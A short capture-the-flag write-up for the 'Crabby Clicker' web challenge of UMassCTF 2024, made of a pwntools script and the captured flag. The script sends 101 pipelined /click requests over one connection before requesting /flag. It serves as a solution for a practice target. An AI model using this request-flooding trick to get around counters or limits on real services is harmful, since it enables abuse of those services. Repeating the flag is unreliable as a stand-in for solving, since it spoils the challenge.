---
title: "Crabby Clicker - UMassCTF 2024"
category: "web"
type: "writeup"
tags: ["web", "crabby", "clicker", "umassctf", "umassctf-2024", "2024", "ctf-writeup"]
summary: "SERVER=\"crabby-clicker.ctf.umasscybersec.org\""
source:
  name: "CTFtime writeup #39079"
  url: "https://ctftime.org/writeup/39079"
ctf:
  name: "UMassCTF 2024"
  year: 2024
  challenge: "Crabby Clicker"
---

## Metadata

- **CTF:** UMassCTF 2024
- **Task:** Crabby Clicker
- **Author team:** Owl Hackers
- **CTFtime:** <https://ctftime.org/writeup/39079>

---
```  
# -*- coding: utf8 -*-  
from pwn import *  
context.log_level='debug'  
SERVER="[crabby-clicker.ctf.umasscybersec.org](http://crabby-clicker.ctf.umasscybersec.org)"  
PORT=80

payload=b"GET /click HTTP/1.1\r\n\r\n"

p = remote(SERVER, PORT)  
for i in range(0, 101):  
p.send(payload)

payload=b"GET /flag HTTP/1.1\r\n\r\n"  
p.send(payload)  
recv = p.recvall()  
print(recv)  
```

// UMASS{y_w0uld_u_w4nt_mult1p13_r3qu35t5}
